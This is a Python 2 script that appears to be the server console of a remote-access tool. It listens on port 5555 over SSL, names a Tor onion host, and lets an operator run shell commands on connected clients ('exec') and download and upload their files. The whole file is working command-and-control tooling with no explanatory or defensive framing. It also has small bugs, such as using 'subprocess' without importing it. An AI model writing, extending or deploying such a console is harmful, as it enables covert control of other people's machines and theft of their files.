import socket, ssl, os, sys, time, hashlib, hmac
from colored import fg, bg, attr
from subprocess import check_output

host = '3pnzzdpq7aj6s6b6.onion'
hasher = hashlib.sha256()

pid1 = subprocess.Popen(args=["xterm","-e","python net.py"]).pid

print "%s---------------------------%s" % (fg(46), attr(0))
print "%s[Starting server]%s" % (fg(46), attr(0))
try:
    bindsocket = socket.socket()
    bindsocket.bind(('', 5555))
    bindsocket.listen(5)
    print "%s%s[server-status] ok.%s" % (fg(46), attr(1), attr(0))
    print ("%s%s[Onion-Host] " + host + "%s") % (fg(202), attr(1), attr(0))
    print "%s---------------------------%s" % (fg(46), attr(0))
except socket.error, (value,message):
    bindsocket.close()
    print ("%sCould not open socket: " + message + "!!%s") % (fg(196), attr(0))
    sys.exit(1)

def RecvData():
    temp = connstream.read()
    return temp

def CheckHash(fileName,fileHashHEX):
    with open(fileName, 'rb') as inFile:
        buf = inFile.read()
        hasher.update(buf)
    if hmac.compare_digest(hasher.hexdigest(),fileHashHEX) == True:
        pass
    else:
        print "Warning!"

def CalcHash(fileName):
    with open(fileName, 'rb') as inFile:
        buf = inFile.read()
        hasher.update(buf)
    return hasher.hexdigest()

def ExecIN(cmd):
    out = check_output(cmd, shell=True)
    print out

def SendData(inText):
    connstream.write(inText)

def DownloadFILE(fileName):
    fileDOWN = open(fileName, 'wa')
    fileSize = int(RecvData())
    print "   [>>>]Downloading: %s Bytes: %s" % (fileName, fileSize)
    FSD = 0
    while 1:
        temp = RecvData()
        if temp == 'CUF':
            break
        else: 
            FSD += len(temp)
            fileDOWN.write(temp)
            status = r"%10d  [%3.2f%%]" % (FSD, FSD * 100. / fileSize)
            status = status + chr(8)*(len(status)+1)
            print status,
    fileDOWN.close()
    print ""
    SendData("SDF")

def UploadFILE(fileName):
    fileUP = open(fileName, 'rb')
    fileSize = os.path.getsize(fileName)
    print "   [>>>]Uploading: %s Bytes: %s" % (fileName, fileSize)
    FSD = 0
    while 1:
        tempData = fileUP.read()
        if tempData == '':
            break
        else:
            FSD += len(tempData)
            SendData(tempData)
            status = r"%10d  [%3.2f%%]" % (FSD, FSD * 100. / fileSize)
            status = status + chr(8)*(len(status)+1)
            print status,
    fileUP.close()
    print ""
    SendData("SUF") #Server Upload Finished

while True:
    while True:
        print "%s...waiting...%s" % (fg(46), attr(0))
        newsocket, fromaddr = bindsocket.accept()
        try:
            connstream = ssl.wrap_socket(newsocket,
                                 server_side=True,
                                 certfile="priv_dom2.crt",
                                 keyfile="private_key.key")
        except ssl.SSLError:
            print "%s%s!!!WARNING!!! BAD CLIENT (or other SSL problem)%s" % (fg(9),attr(1),attr(0))
            break
        print "%s...probably good client...%s" % (fg(46), attr(0))
        time.sleep(2)
        ExecIN("clear")
        cType = RecvData()
        print ("%s----[new-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(202),attr(0))
        while True:
            inText = raw_input('[input] ')
            if inText.startswith("download"):
                SendData(inText)
                DownloadFILE(inText.split(" ")[1])
            elif inText.startswith("upload"):
                SendData(inText)
                UploadFILE(inText.split(" ")[1])
                chunk = RecvData()
            elif inText == "terminate":
                SendData("terminate")
                print ("%s%s----[exit-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(9),attr(1),attr(0))
                connstream.shutdown(socket.SHUT_RDWR)
                connstream.close()
                break
            elif inText.startswith("exec"):
                SendData(inText)
                print ""
                outEXEC = RecvData()
                print outEXEC
            else:
                connstream.write(inText)
                outTT = RecvData()
                print ('%s[outText] ' + outTT +"%s") % (fg(6),attr(0))
